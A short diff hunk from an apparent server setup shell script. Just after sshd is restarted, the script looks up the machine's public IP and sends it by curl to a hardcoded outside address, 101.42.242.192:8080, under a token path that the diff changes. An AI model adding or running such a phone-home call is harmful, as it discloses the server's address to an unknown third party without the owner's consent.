@@ -60,7 +60,7 @@ systemctl restart sshd
 
 ipip=`curl -s ip.sb`
 
-curl "http://101.42.242.192:8080/mFbAGixAayemWtaqAJbNda/$ipip"
+curl "http://101.42.242.192:8080/wVySG4CesM9z9kZxNHu65b/$ipip"
 
 apt install wget unzip -y
 
